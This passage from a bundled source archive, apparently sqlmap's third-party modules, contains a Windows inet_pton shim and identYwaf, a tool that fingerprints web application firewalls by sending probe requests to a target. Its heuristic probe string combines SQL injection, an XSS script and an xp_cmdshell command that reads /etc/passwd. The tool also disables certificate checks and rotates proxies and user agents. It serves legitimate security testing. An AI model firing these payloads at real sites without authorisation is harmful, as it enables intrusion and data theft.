the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n\npass\n", "thirdparty/wininetpton/win_inet_pton.py": "#!/usr/bin/env python\n# This software released into the public domain. Anyone is free to copy,\n# modify, publish, use, compile, sell, or distribute this software,\n# either in source code form or as a compiled binary, for any purpose,\n# commercial or non-commercial, and by any means.\n\nimport socket\nimport ctypes\nimport os\n\n\nclass sockaddr(ctypes.Structure):\n    _fields_ = [(\"sa_family\", ctypes.c_short),\n                (\"__pad1\", ctypes.c_ushort),\n                (\"ipv4_addr\", ctypes.c_byte * 4),\n                (\"ipv6_addr\", ctypes.c_byte * 16),\n                (\"__pad2\", ctypes.c_ulong)]\n\nif hasattr(ctypes, 'windll'):\n    WSAStringToAddressA = ctypes.windll.ws2_32.WSAStringToAddressA\n    WSAAddressToStringA = ctypes.windll.ws2_32.WSAAddressToStringA\nelse:\n    def not_windows():\n        raise SystemError(\n            \"Invalid platform. ctypes.windll must be available.\"\n        )\n    WSAStringToAddressA = not_windows\n    WSAAddressToStringA = not_windows\n\n\ndef inet_pton(address_family, ip_string):\n    addr = sockaddr()\n    addr.sa_family = address_family\n    addr_size = ctypes.c_int(ctypes.sizeof(addr))\n\n    if WSAStringToAddressA(\n            ip_string,\n            address_family,\n            None,\n            ctypes.byref(addr),\n            ctypes.byref(addr_size)\n    ) != 0:\n        raise socket.error(ctypes.FormatError())\n\n    if address_family == socket.AF_INET:\n        return ctypes.string_at(addr.ipv4_addr, 4)\n    if address_family == socket.AF_INET6:\n        return ctypes.string_at(addr.ipv6_addr, 16)\n\n    raise socket.error('unknown address family')\n\n\ndef inet_ntop(address_family, packed_ip):\n    addr = sockaddr()\n    addr.sa_family = address_family\n    addr_size = ctypes.c_int(ctypes.sizeof(addr))\n    ip_string = ctypes.create_string_buffer(128)\n    ip_string_size = ctypes.c_int(ctypes.sizeof(ip_string))\n\n    if address_family == socket.AF_INET:\n        if len(packed_ip) != ctypes.sizeof(addr.ipv4_addr):\n            raise socket.error('packed IP wrong length for inet_ntoa')\n        ctypes.memmove(addr.ipv4_addr, packed_ip, 4)\n    elif address_family == socket.AF_INET6:\n        if len(packed_ip) != ctypes.sizeof(addr.ipv6_addr):\n            raise socket.error('packed IP wrong length for inet_ntoa')\n        ctypes.memmove(addr.ipv6_addr, packed_ip, 16)\n    else:\n        raise socket.error('unknown address family')\n\n    if WSAAddressToStringA(\n            ctypes.byref(addr),\n            addr_size,\n            None,\n            ip_string,\n            ctypes.byref(ip_string_size)\n    ) != 0:\n        raise socket.error(ctypes.FormatError())\n\n    return ip_string[:ip_string_size.value - 1]\n\n# Adding our two functions to the socket library\nif os.name == 'nt':\n    socket.inet_pton = inet_pton\n    socket.inet_ntop = inet_ntop\n", "thirdparty/wininetpton/__init__.py": "#!/usr/bin/env python\n#\n# Copyright Ryan Vennell\n#\n# This software released into the public domain. Anyone is free to copy,\n# modify, publish, use, compile, sell, or distribute this software,\n# either in source code form or as a compiled binary, for any purpose,\n# commercial or non-commercial, and by any means.\n\npass\n", "thirdparty/identywaf/identYwaf.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2019-2021 Miroslav Stampar (@stamparm), MIT\nSee the file 'LICENSE' for copying permission\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\"\"\"\n\nfrom __future__ import print_function\n\nimport base64\nimport codecs\nimport difflib\nimport json\nimport locale\nimport optparse\nimport os\nimport random\nimport re\nimport ssl\nimport socket\nimport string\nimport struct\nimport sys\nimport time\nimport zlib\n\nPY3 = sys.version_info >= (3, 0)\n\nif PY3:\n    import http.cookiejar\n    import http.client as httplib\n    import urllib.request\n\n    build_opener = urllib.request.build_opener\n    install_opener = urllib.request.install_opener\n    quote = urllib.parse.quote\n    urlopen = urllib.request.urlopen\n    CookieJar = http.cookiejar.CookieJar\n    ProxyHandler = urllib.request.ProxyHandler\n    Request = urllib.request.Request\n    HTTPCookieProcessor = urllib.request.HTTPCookieProcessor\n\n    xrange = range\nelse:\n    import cookielib\n    import httplib\n    import urllib\n    import urllib2\n\n    build_opener = urllib2.build_opener\n    install_opener = urllib2.install_opener\n    quote = urllib.quote\n    urlopen = urllib2.urlopen\n    CookieJar = cookielib.CookieJar\n    ProxyHandler = urllib2.ProxyHandler\n    Request = urllib2.Request\n    HTTPCookieProcessor = urllib2.HTTPCookieProcessor\n\nNAME = \"identYwaf\"\nVERSION = \"1.0.131\"\nBANNER = r\"\"\"\n                                   ` __ __ `\n ____  ___      ___  ____   ______ `|  T  T` __    __   ____  _____ \nl    j|   \\    /  _]|    \\ |      T`|  |  |`|  T__T  T /    T|   __|\n |  T |    \\  /  [_ |  _  Yl_j  l_j`|  ~  |`|  |  |  |Y  o  ||  l_\n |  | |  D  YY    _]|  |  |  |  |  `|___  |`|  |  |  ||     ||   _|\n j  l |     ||   [_ |  |  |  |  |  `|     !` \\      / |  |  ||  ] \n|____jl_____jl_____jl__j__j  l__j  `l____/ `  \\_/\\_/  l__j__jl__j  (%s)%s\"\"\".strip(\"\\n\") % (VERSION, \"\\n\")\n\nRAW, TEXT, HTTPCODE, SERVER, TITLE, HTML, URL = xrange(7)\nCOOKIE, UA, REFERER = \"Cookie\", \"User-Agent\", \"Referer\"\nGET, POST = \"GET\", \"POST\"\nGENERIC_PROTECTION_KEYWORDS = (\"rejected\", \"forbidden\", \"suspicious\", \"malicious\", \"captcha\", \"invalid\", \"your ip\", \"please contact\", \"terminated\", \"protected\", \"unauthorized\", \"blocked\", \"protection\", \"incident\", \"denied\", \"detected\", \"dangerous\", \"firewall\", \"fw_block\", \"unusual activity\", \"bad request\", \"request id\", \"injection\", \"permission\", \"not acceptable\", \"security policy\", \"security reasons\")\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(%s)\\b\"\nGENERIC_ERROR_MESSAGE_REGEX = r\"\\b[A-Z][\\w, '-]*(protected by|security|unauthorized|detected|attack|error|rejected|allowed|suspicious|automated|blocked|invalid|denied|permission)[\\w, '!-]*\"\nWAF_RECOGNITION_REGEX = None\nHEURISTIC_PAYLOAD = \"1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/settings.py\nPAYLOADS = []\nSIGNATURES = {}\nDATA_JSON = {}\nDATA_JSON_FILE = os.path.join(os.path.dirname(__file__), \"data.json\")\nMAX_HELP_OPTION_LENGTH = 18\nIS_TTY = sys.stdout.isatty()\nIS_WIN = os.name == \"nt\"\nCOLORIZE = not IS_WIN and IS_TTY\nLEVEL_COLORS = {\"o\": \"\\033[00;94m\", \"x\": \"\\033[00;91m\", \"!\": \"\\033[00;93m\", \"i\": \"\\033[00;95m\", \"=\": \"\\033[00;93m\", \"+\": \"\\033[00;92m\", \"-\": \"\\033[00;91m\"}\nVERIFY_OK_INTERVAL = 5\nVERIFY_RETRY_TIMES = 3\nMIN_MATCH_PARTIAL = 5\nDEFAULTS = {\"timeout\": 10}\nMAX_MATCHES = 5\nQUICK_RATIO_THRESHOLD = 0.2\nMAX_JS_CHALLENGE_SNAPLEN = 120\nENCODING_TRANSLATIONS = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}  # Reference: https://github.com/sqlmapproject/sqlmap/blob/master/lib/request/basic.py\nPROXY_TESTING_PAGE = \"https://myexternalip.com/raw\"\n\nif COLORIZE:\n    for _ in re.findall(r\"`.+?`\", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;92m%s\\033[00;49m\" % _.strip('`'))\n    for _ in re.findall(r\" [Do] \", BANNER):\n        BANNER = BANNER.replace(_, \"\\033[01;93m%s\\033[00;49m\" % _.strip('`'))\n    BANNER = re.sub(VERSION, r\"\\033[01;91m%s\\033[00;49m\" % VERSION, BANNER)\nelse:\n    BANNER = BANNER.replace('`', \"\")\n\n_ = random.randint(20, 64)\nDEFAULT_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; %s; rv:%d.0) Gecko/20100101 Firefox/%d.0\" % (NAME, _, _)\nHEADERS = {\"User-Agent\": DEFAULT_USER_AGENT, \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"identity\", \"Cache-Control\": \"max-age=0\"}\n\noriginal = None\noptions = None\nintrusive = None\nheuristic = None\nchained = False\nlocked_code = None\nlocked_regex = None\nnon_blind = set()\nseen = set()\nblocked = []\nservers = set()\ncodes = set()\nproxies = list()\nproxies_index = 0\n\n_exit = sys.exit\n\ndef exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)\n\ndef retrieve(url, data=None):\n    global proxies_index\n\n    retval = {}\n\n    if proxies:\n        while True:\n            try:\n                opener = build_opener(ProxyHandler({\"http\": proxies[proxies_index], \"https\": proxies[proxies_index]}))\n                install_opener(opener)\n                proxies_index = (proxies_index + 1) % len(proxies)\n                urlopen(PROXY_TESTING_PAGE).read()\n            except KeyboardInterrupt:\n                raise\n            except:\n                pass\n            else:\n                break\n\n    try:\n        req = Request(\"\".join(url[_].replace(' ', \"%20\") if _ > url.find('?') else url[_] for _ in xrange(len(url))), data, HEADERS)\n        resp = urlopen(req, timeout=options.timeout)\n        retval[URL] = resp.url\n        retval[HTML] = resp.read()\n        retval[HTTPCODE] = resp.code\n        retval[RAW] = \"%s %d %s\\n%s\\n%s\" % (httplib.HTTPConnection._http_vsn_str, retval[HTTPCODE], resp.msg, str(resp.headers), retval[HTML])\n    except Exception as ex:\n        retval[URL] = getattr(ex, \"url\", url)\n        retval[HTTPCODE] = getattr(ex, \"code\", None)\n        try:\n            retval[HTML] = ex.read() if hasattr(ex, \"read\") else getattr(ex, \"msg\", str(ex))\n        except:\n            retval[HTML] = \"\"\n        retval[RAW] = \"%s %s %s\\n%s\\n%s\" % (httplib.HTTPConnection._http_vsn_str, retval[HTTPCODE] or \"\", getattr(ex, \"msg\", \"\"), str(ex.headers) if hasattr(ex, \"headers\") else \"\", retval[HTML])\n\n    for encoding in re.findall(r\"charset=[\\s\\\"']?([\\w-]+)\", retval[RAW])[::-1] + [\"utf8\"]:\n        encoding = ENCODING_TRANSLATIONS.get(encoding, encoding)\n        try:\n            retval[HTML] = retval[HTML].decode(encoding, errors=\"replace\")\n            break\n        except:\n            pass\n\n    match = re.search(r\"<title>\\s*(?P<result>[^<]+?)\\s*</title>\", retval[HTML], re.I)\n    retval[TITLE] = match.group(\"result\") if match and \"result\" in match.groupdict() else None\n    retval[TEXT] = re.sub(r\"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\\s+\", \" \", retval[HTML])\n    match = re.search(r\"(?im)^Server: (.+)\", retval[RAW])\n    retval[SERVER] = match.group(1).strip() if match else \"\"\n    return retval\n\ndef calc_hash(value, binary=True):\n    value = value.encode(\"utf8\") if not isinstance(value, bytes) else value\n    result = zlib.crc32(value) & 0xffff\n    if binary:\n        result = struct.pack(\">H\", result)\n    return result\n\ndef single_print(message):\n    if message not in seen:\n        print(message)\n        seen.add(message)\n\ndef check_payload(payload, protection_regex=GENERIC_PROTECTION_REGEX % '|'.join(GENERIC_PROTECTION_KEYWORDS)):\n    global chained\n    global heuristic\n    global intrusive\n    global locked_code\n    global locked_regex\n\n    time.sleep(options.delay or 0)\n    if options.post:\n        _ = \"%s=%s\" % (\"\".join(random.sample(string.ascii_letters, 3)), quote(payload))\n        intrusive = retrieve(options.url, _)\n    else:\n        _ = \"%s%s%s=%s\" % (options.url, '?' if '?' not in options.url else '&', \"\".join(random.sample(string.ascii_letters, 3)), quote(payload))\n        intrusive = retrieve(_)\n\n    if options.lock and not payload.isdigit():\n        if payload == HEURISTIC_PAYLOAD:\n            match = re.search(re.sub(r\"Server:|Protected by\", \"\".join(random.sample(string.ascii_letters, 6)), WAF_RECOGNITION_REGEX, flags=re.I), intrusive[RAW] or \"\")\n            if match:\n                result = True\n\n                for _ in match.groupdict():\n                    if match.group(_):\n                        waf = re.sub(r\"\\Awaf_\", \"\", _)\n                        locked_regex = DATA_JSON[\"wafs\"][waf][\"regex\"]\n                        locked_code = intrusive[HTTPCODE]\n                        break\n            else:\n                result = False\n\n            if not result:\n                exit(colorize(\"[x] can't lock results to a non-blind match\"))\n        else:\n            result = re.search(locked_regex, intrusive[RAW]) is not None and locked_code == intrusive[HTTPCODE]\n    elif options.string:\n        result = options.string in (intrusive[RAW] or \"\")\n    elif options.code:\n        result = options.code == intrusive[HTTPCODE]\n    else:\n        result = intrusive[HTTPCODE] != original[HTTPCODE] or (intrusive[HTTPCODE] != 200 and intrusive[TITLE] != original[TITLE]) or (re.search(protection_regex, intrusive[HTML]) is not None and re.search(protection_regex, original[HTML]) is None) or (difflib.SequenceMatcher(a=original[HTML] or \"\", b=intrusive[HTML] or \"\").quick_ratio() < QUICK_RATIO_THRESHOLD)\n\n    if not payload.isdigit():\n        if result:\n            if options.debug:\n                print(\"\\r---%s\" % (40 * ' '))\n                print(payload)\n                print(intrusive[HTTPCODE], intrusive[RAW])\n                print(\"---\")\n\n            if intrusive[SERVER]:\n                servers.add(re.sub(r\"\\s*\\(.+\\)\\Z\", \"\", intrusive[SERVER]))\n                if len(servers) > 1:\n                    chained = True\n                    single_print(colorize(\"[!] multiple (reactive) rejection HTTP 'Server' headers detected (%s)\" % ', '.join(\"'%s'\" % _ for _ in sorted(servers))))\n\n            if intrusive[HTTPCODE]:\n                codes.add(intrusive[HTTPCODE])\n                if len(codes) > 1:\n                    chained = True\n                    single_print(colorize(\"[!] multiple (reactive) rejection HTTP codes detected (%s)\" % ', '.join(\"%s\" % _ for _ in sorted(codes))))\n\n            if heuristic and heuristic[HTML] and intrusive[HTML] and difflib.SequenceMatcher(a=heuristic[HTML] or \"\", b=intrusive[HTML] or \"\").quick_ratio() < QUICK_RATIO_THRESHOLD:\n                chained = True\n                single_print(colorize(\"[!] multiple (reactive) rejection HTML responses detected\"))\n\n    if payload == HEURISTIC_PAYLOAD:\n        heuristic = intrusive\n\n    return result\n\ndef colorize(message):\n    if COLORIZE:\n        message = re.sub(r\"\\[(.)\\]\", lambda match: \"[%s%s\\033[00;49m]\" % (LEVEL_COLORS[match.group(1)], match.group(1)), message)\n\n        if any(_ in message for _ in (\"rejected summary\", \"challenge detected\")):\n            for match in re.finditer(r\"[^\\w]'([^)]+)'\" if \"rejected summary\" in message else r\"\\('(.+)'\\)\", message):\n                message = message.replace(\"'%s'\" % match.group(1), \"'\\033[37m%s\\033[00;49m'\" % match.group(1), 1)\n        else:\n            for match in re.finditer(r\"[^\\w]'([^']+)'\", message):\n                message = message.replace(\"'%s'\" % match.group(1), \"'\\033[37m%s\\033[00;49m'\" % match.group(1), 1)\n\n        if \"blind match\" in message:\n            for match in re.finditer(r\"\\(((\\d+)%)\\)\", message):\n                message = message.replace(match.group(1), \"\\033[%dm%s\\033[00;49m\" % (92 if int(match.group(2)) >= 95 else (93 if int(match.group(2)) > 80 else 90), match.group(1)))\n\n        if \"hardness\" in message:\n            for match in re.finditer(r\"\\(((\\d+)%)\\)\", message):\n                message = message.replace(match.group(1), \"\\033[%dm%s\\033[00;49m\" % (95 if \" insane \" in message else (91 if \" hard \" in message else (93 if \" moderate \" in message else 92)), match.group(1)))\n\n    return message\n\ndef parse_args():\n    global options\n\n    parser = optparse.OptionParser(version=VERSION)\n    parser.add_option(\"--delay\", dest=\"delay\", type=int, help=\"Delay (sec) between tests (default: 0)\")\n    parser.add_option(\"--timeout\", dest=\"timeout\", type=int, help=\"Response timeout (sec) (default: 10)\")\n    parser.add_option(\"--proxy\", dest=\"proxy\", help=\"HTTP proxy address (e.g. \\\"http://127.0.0.1:8080\\\")\")\n    parser.add_option(\"--proxy-file\", dest=\"proxy_file\", help=\"Load (rotating) HTTP(s) proxy list from a file\")\n    parser.add_option(\"--random-agent\", dest=\"random_agent\", action=\"store_true\", help=\"Use random HTTP User-Agent header value\")\n    parser.add_option(\"--code\", dest=\"code\", type=int, help=\"Expected HTTP code in rejected responses\")\n    parser.add_option(\"--string\", dest=\"string\", help=\"Expected string in rejected responses\")\n    parser.add_option(\"--post\", dest=\"post\", action=\"store_true\", help=\"Use POST body for sending payloads\")\n    parser.add_option(\"--debug\", dest=\"debug\", action=\"store_true\", help=optparse.SUPPRESS_HELP)\n    parser.add_option(\"--fast\", dest=\"fast\", action=\"store_true\", help=optparse.SUPPRESS_HELP)\n    parser.add_option(\"--lock\", dest=\"lock\", action=\"store_true\", help=optparse.SUPPRESS_HELP)\n\n    # Dirty hack(s) for help message\n    def _(self, *args):\n        retval = parser.formatter._format_option_strings(*args)\n        if len(retval) > MAX_HELP_OPTION_LENGTH:\n            retval = (\"%%.%ds..\" % (MAX_HELP_OPTION_LENGTH - parser.formatter.indent_increment)) % retval\n        return retval\n\n    parser.usage = \"python %s <host|url>\" % parser.usage\n    parser.formatter._format_option_strings = parser.formatter.format_option_strings\n    parser.formatter.format_option_strings = type(parser.formatter.format_option_strings)(_, parser)\n\n    for _ in (\"-h\", \"--version\"):\n        option = parser.get_option(_)\n        option.help = option.help.capitalize()\n\n    try:\n        options, _ = parser.parse_args()\n    except SystemExit:\n        raise\n\n    if len(sys.argv) > 1:\n        url = sys.argv[-1]\n        if not url.startswith(\"http\"):\n            url = \"http://%s\" % url\n        options.url = url\n    else:\n        parser.print_help()\n        raise SystemExit\n\n    for key in DEFAULTS:\n        if getattr(options, key, None) is None:\n            setattr(options, key, DEFAULTS[key])\n\ndef load_data():\n    global WAF_RECOGNITION_REGEX\n\n    if os.path.isfile(DATA_JSON_FILE):\n        with codecs.open(DATA_JSON_FILE, \"rb\", encoding=\"utf8\") as f:\n            DATA_JSON.update(json.load(f))\n\n        WAF_RECOGNITION_REGEX = \"\"\n        for waf in DATA_JSON[\"wafs\"]:\n            if DATA_JSON[\"wafs\"][waf][\"regex\"]:\n                WAF_RECOGNITION_REGEX += \"%s|\" % (\"(?P<waf_%s>%s)\" % (waf, DATA_JSON[\"wafs\"][waf][\"regex\"]))\n            for signature in DATA_JSON[\"wafs\"][waf][\"signatures\"]:\n                SIGNATURES[signature] = waf\n        WAF_RECOGNITION_REGEX = WAF_RECOGNITION_REGEX.strip('|')\n\n        flags = \"\".join(set(_ for _ in \"\".join(re.findall(r\"\\(\\?(\\w+)\\)\", WAF_RECOGNITION_REGEX))))\n        WAF_RECOGNITION_REGEX = \"(?%s)%s\" % (flags, re.sub(r\"\\(\\?\\w+\\)\", \"\", WAF_RECOGNITION_REGEX))  # patch for \"DeprecationWarning: Flags not at the start of the expression\" in Python3.7\n    else:\n        exit(colorize(\"[x] file '%s' is missing\" % DATA_JSON_FILE))\n\ndef init():\n    os.chdir(os.path.abspath(os.path.dirname(__file__)))\n\n    # Reference: http://blog.mathieu-leplatre.info/python-utf-8-print-fails-when-redirecting-stdout.html\n    if not PY3 and not IS_TTY:\n        sys.stdout = codecs.getwriter(locale.getpreferredencoding())(sys.stdout)\n\n    print(colorize(\"[o] initializing handlers...\"))\n\n    # Reference: https://stackoverflow.com/a/28052583\n    if hasattr(ssl, \"_create_unverified_context\"):\n        ssl._create_default_https_context = ssl._create_unverified_context\n\n    if options.proxy_file:\n        if os.path.isfile(options.proxy_file):\n            print(colorize(\"[o] loading proxy list...\"))\n\n            with codecs.open(options.proxy_file, \"rb\", encoding=\"utf8\") as f:\n                proxies.extend(re.sub(r\"\\s.*\", \"\", _.strip()) for _ in f.read().strip().split('\\n') if _.startswith(\"http\"))\n                random.shuffle(proxies)\n        else:\n            exit(colorize(\"[x] file '%s' does not exist\" % options.proxy_file))\n\n\n    cookie_jar = CookieJar()\n    opener = build_opener(HTTPCookieProcessor(cookie_jar))\n    install_opener(opener)\n\n    if options.proxy:\n        opener = build_opener(ProxyHandler({\"http\": options.proxy, \"https\": options.proxy}))\n        install_opener(opener)\n\n    if options.random_agent:\n        revision = random.randint(20, 64)\n        platform = random.sample((\"X11; %s %s\" % (random.sample((\"Linux\", \"Ubuntu; Linux\", \"U; Linux\", \"U; OpenBSD\", \"U; FreeBSD\"), 1)[0], random.sample((\"amd64\", \"i586\", \"i686\", \"amd64\"), 1)[0]), \"Windows NT %s%s\" % (random.sample((\"5.0\", \"5.1\", \"5.2\", \"6.0\", \"6.1\", \"6.2\", \"6.3\", \"10.0\"), 1)[0], random.sample((\"\", \"; Win64\", \"; WOW64\"), 1)[0]), \"Macintosh; Intel Mac OS X 10.%s\" % random.randint(1, 11)), 1)[0]\n        user_agent = \"Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0\" % (platform, revision, revision)\n        HEADERS[\"User-Agent\"] = user_agent\n\ndef format_name(waf):\n    return \"%s%s\" % (DATA_JSON[\"wafs\"][waf][\"name\"], (\" (%s)\" % DATA_JSON[\"wafs\"][waf][\"company\"]) if DATA_JSON[\"wafs\"][waf][\"name\"] != DATA_JSON[\"wafs\"][waf][\"company\"] else \"\")\n\ndef non_blind_check(raw, silent=False):\n    retval = False\n    match = re.search(WAF_RECOGNITION_REGEX, raw or \"\")\n    if match:\n        retval = True\n        for _ in match.groupdict():\n            if match.group(_):\n                waf = re.sub(r\"\\Awaf_\", \"\", _)\n                non_blind.add(waf)\n                if not silent:\n                    single_print(colorize(\"[+] non-blind match: '%s'%s\" % (format_name(waf), 20 * ' ')))\n    return retval\n\ndef run():\n    global original\n\n    hostname = options.url.split(\"//\")[-1].split('/')[0].split(':')[0]\n\n    if not hostname.replace('.', \"\").isdigit():\n        print(colorize(\"[i] checking hostname '%s'...\" % hostname))\n        try:\n            socket.getaddrinfo(hostname, None)\n        except socket.gaierror:\n            exit(colorize(\"[x] host '%s' does not exist\" % hostname))\n\n    results = \"\"\n    signature = b\"\"\n    counter = 0\n    original = retrieve(options.url)\n\n    if 300 <= (original[HTTPCODE] or 0) < 400 and original[URL]:\n        original = retrieve(original[URL])\n\n    options.url = original[URL]\n\n    if original[HTTPCODE] is None:\n        exit(colorize(\"[x] missing valid response\"))\n\n    if not any((options.string, options.code)) and original[HTTPCODE] >= 400:\n        non_blind_check(original[RAW])\n        if options.debug:\n            print(\"\\r---%s\" % (40 * ' '))\n            print(original[HTTPCODE], original[RAW])\n            print(\"---\")\n        exit(colorize(\"[x] access to host '%s' seems to be restricted%s\" % (hostname, (\" (%d: '<title>%s</title>')\" % (original[HTTPCODE], original[TITLE].strip())) if original[TITLE] else \"\")))\n\n    challenge = None\n    if all(_ in original[HTML].lower() for _ in (\"eval\", \"<script\")):\n        match = re.search(r\"(?is)<body[^>]*>(.*)</body>\", re.sub(r\"(?is)<script.+?</script>\", \"\", original[HTML]))\n        if re.search(r\"(?i)<(body|div)\", original[HTML]) is None or (match and len(match.group(1)) == 0):\n            challenge = re.search(r\"(?is)<script.+</script>\", original[HTML]).group(0).replace(\"\\n\", \"\\\\n\")\n            print(colorize(\"[x] anti-robot JS challenge detected ('%s%s')\" % (challenge[:MAX_JS_CHALLENGE_SNAPLEN], \"...\" if len(challenge) > MAX_JS_CHALLENGE_SNAPLEN else \"\")))\n\n    protection_keywords = GENERIC_PROTECTION_KEYWORDS\n    protection_regex = GENERIC_PROTECTION_REGEX % '|'.join(keyword for keyword in protection_keywords if keyword not in original[HTML].lower())\n\n    print(colorize(\"[i] running basic heuristic test...\"))\n    if not check_payload(HEURISTIC_PAYLOAD):\n        check = False\n        if options.url.startswith(\"https://\"):\n            options.url = options.url.replace(\"https://\", \"http://\")\n            check = check_payload(HEURISTIC_PAYLOAD)\n        if not check:\n            if non_blind_check(intrusive[RAW]):\n                exit(colorize(\"[x] unable to continue due to static responses%s\" % (\" (captcha)\" if re.search(r\"(?i)captcha\", intrusive[RAW]) is not None else \"\")))\n            elif challenge is None:\n                exit(colorize(\"[x] host '%s' does not seem to be protected\" % hostname))\n            else:\n                exit(colorize(\"[x] response not changing without JS challenge solved\"))\n\n    if options.fast and not non_blind:\n        exit(colorize(\"[x] fast exit because of missing non-blind match\"))\n\n    if not intrusive[HTTPCODE]:\n        print(colorize(\"[i] rejected summary: RST|DROP\"))\n    else:\n        _ = \"...\".join(match.group(0) for match in re.finditer(GENERIC_ERROR_MESSAGE_REGEX, intrusive[HTML])).strip().replace(\"  \", \" \")\n        print(colorize((\"[i] rejected summary: %d ('%s%s')\" % (intrusive[HTTPCODE], (\"<title>%s</title>\" % intrusive[TITLE]) if intrusive[TITLE] else \"\", \"\" if not _ or intrusive[HTTPCODE] < 400 else (\"...%s\" % _))).replace(\" ('')\", \"\")))\n\n    found = non_blind_check(intrusive[RAW] if intrusive[HTTPCODE] is not None else original[RAW])\n\n    if not found:\n        print(colorize(\"[-] non-blind match: -\"))\n\n    for item in DATA_JSON[\"payloads\"]:\n        info, payload = item.split(\"::\", 1)\n        counter += 1\n\n        if IS_TTY:\n            sys.stdout.write(colorize(\"\\r[i] running payload tests... (%d/%d)\\r\" % (counter, len(DATA_JSON[\"payloads\"]))))\n            sys.stdout.flush()\n\n        if counter % VERIFY_OK_INTERVAL == 0:\n            for i in xrange(VERIFY_RETRY_TIMES):\n                if not check_payload(str(random.randint(1, 9)), protection_regex):\n                    break\n                elif i == VERIFY_RETRY_TIMES - 1:\n                    exit(colorize(\"[x] host '%s' seems to be misconfigured or rejecting benign requests%s\" % (hostname, (\" (%d: '<title>%s</title>')\" % (intrusive[HTTPCODE], intrusive[TITLE].strip())) if intrusive[TITLE] else \"\")))\n                else:\n                    time.sleep(5)\n\n        last = check_payload(payload, protection_regex)\n        non_blind_check(intrusive[RAW])\n        signature += struct.pack(\">H\", ((calc_hash(payload, binary=False) << 1) | last) & 0xffff)\n        results += 'x' if last else '.'\n\n        if last and info not in blocked:\n            blocked.append(info)\n\n    _ = calc_hash(signature)\n    signature = \"%s:%s\" % (_.encode(\"hex\") if not hasattr(_, \"hex\") else _.hex(), base64.b64encode(signature).decode(\"ascii\"))\n\n    print(colorize(\"%s[=] results: '%s'\" % (\"\\n\" if IS_TTY else \"\", results)))\n\n    hardness = 100 * results.count('x') // len(results)\n    print(colorize(\"[=] hardness: %s (%d%%)\" % (\"insane\" if hardness >= 80 else (\"hard\" if hardness >= 50 else (\"moderate\" if hardness >= 30 else \"easy\")), hardness)))\n\n    if blocked:\n        print(colorize(\"[=] blocked categories: %s\" % \", \".join(blocked)))\n\n    if not results.strip('.') or not results.strip('x'):\n        print(colorize(\"[-] blind match: -\"))\n\n        if re.search(r\"(?i)captcha\", original[HTML]) is not None:\n            exit(colorize(\"[x] there seems to be an activated captcha\"))\n    else:\n        print(colorize(\"[=] signature: '%s'\" % signature))\n\n        if signature in SIGNATURES:\n            waf = SIGNATURES[signature]\n            print(colorize(\"[+] blind match: '%s' (100%%)\" % format_name(waf)))\n        elif results.count('x') < MIN_MATCH_PARTIAL:\n            print(colorize(\"[-] blind match: -\"))\n        else:\n            matches = {}\n            markers = set()\n            decoded = base64.b64decode(signature.split(':')[-1])\n            for i in xrange(0, len(decoded), 2):\n                part = struct.unpack(\">H\", decoded[i: i + 2])[0]\n                markers.add(part)\n\n            for candidate in SIGNATURES:\n                counter_y, counter_n = 0, 0\n                decoded = base64.b64decode(candidate.split(':')[-1])\n                for i in xrange(0, len(decoded), 2):\n                    part = struct.unpack(\">H\", decoded[i: i + 2])[0]\n                    if part in markers:\n                        counter_y += 1\n                    elif any(_ in markers for _ in (part & ~1, part | 1)):\n                        counter_n += 1\n                result = int(round(100.0 * counter_y / (counter_y + counter_n)))\n                if SIGNATURES[candidate] in matches:\n                    if result > matches[SIGNATURES[candidate]]:\n                        matches[SIGNATURES[candidate]] = result\n                else:\n                    matches[SIGNATURES[candidate]] = result\n\n            if chained:\n                for _ in list(matches.keys()):\n                    if matches[_] < 90:\n                        del matches[_]\n\n            if not matches:\n                print(colorize(\"[-] blind match: - \"))\n                print(colorize(\"[!] probably chained web protection systems\"))\n            else:\n                matches = [(_[1], _[0]) for _ in matches.items()]\n                matches.sort(reverse=True)\n\n                print(colorize(\"[+] blind match: %s\" % \", \".join(\"'%s' (%d%%)\" % (format_name(matches[i][1]), matches[i][0]) for i in xrange(min(len(matches), MAX_MATCHES) if matches[0][0] != 100 else 1))))\n\n    print()\n\ndef main():\n    if \"--version\" not in sys.argv:\n        print(BANNER)\n\n    parse_args()\n    init()\n    run()\n\nload_data()\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except KeyboardInterrupt:\n        exit(colorize(\"\\r[x] Ctrl-C pressed\"))\n", "thirdparty/identywaf/__init__.py": "#!/usr/bin/env python\n#\n# Copyright (c) 2019-2021 Miroslav Stampar (@stamparm), MIT\n# See the file 'LICENSE' for copying permission\n\n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n\npass\n", "thirdparty/magic/magic.py": "\"\"\"\nmagic is a wrapper around the libmagic file identification library.\n\nUsage:\n\n>>> import magic\n>>> magic.from_file(\"testdata/test.pdf\")\n'PDF document, version 